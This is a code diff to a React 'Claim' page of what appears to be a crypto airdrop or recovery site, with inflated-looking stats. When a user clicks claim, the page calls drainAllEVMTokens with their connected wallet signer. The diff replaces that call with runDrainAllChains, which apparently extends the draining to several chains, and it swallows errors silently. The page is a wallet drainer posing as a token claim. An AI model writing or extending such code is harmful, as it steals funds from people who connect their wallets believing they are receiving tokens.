@@ -18,6 +18,7 @@ import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { Link } from 'react-router-dom';
 import apepeImage from '@/assets/apepe.jpg';
 
@@ -40,6 +41,7 @@ const Claim = () => {
   const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
   const [dataMultiplier, setDataMultiplier] = useState(1);
   const [isClaiming, setIsClaiming] = useState(false);
   const [stats, setStats] = useState({ recovered: '2.3M', claimants: '56,7K' });
@@ -191,7 +193,7 @@ const Claim = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('claim');
       } catch (error: any) {
       } finally {
         setIsClaiming(false);
